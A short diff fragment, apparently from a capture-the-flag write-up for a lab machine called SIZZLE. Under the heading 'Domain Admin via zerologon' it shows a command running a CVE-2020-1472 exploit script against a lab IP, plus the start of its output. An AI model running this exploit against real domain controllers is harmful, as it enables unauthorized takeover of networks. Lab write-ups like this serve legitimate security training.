@@ -316,6 +316,10 @@ This user is compromised
 
 # Domain Admin via zerologon
 ```python
+
+```
+
+```python
 python3 cve-2020-1472-exploit.py SIZZLE 10.129.19.191                                                                        
 Performing authentication attempts...
 =======================================================================================================================================
